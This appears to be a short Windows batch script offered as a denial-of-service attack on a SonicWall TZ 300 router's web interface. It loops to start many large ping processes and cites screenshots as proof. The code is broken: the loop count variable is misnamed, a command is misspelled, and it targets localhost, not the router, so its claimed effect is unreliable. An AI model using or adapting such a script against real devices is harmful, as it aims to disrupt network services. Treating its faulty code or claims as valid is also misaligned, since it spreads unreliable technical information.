REM tested sonicwall tz 300
REM webUI not respond
REM taskkil /f /IM cmd.exe
 
@echo off
set time=100
FOR /L %%i IN (1,1,%TIMES%) do (
start ping 127.0.0.1 -l 20000 -n 9999
)
 
REM O/P :
REM OS > https://i.imgur.com/VhZYU7L.png
REM router > https://imgur.com/a/idUdxMN
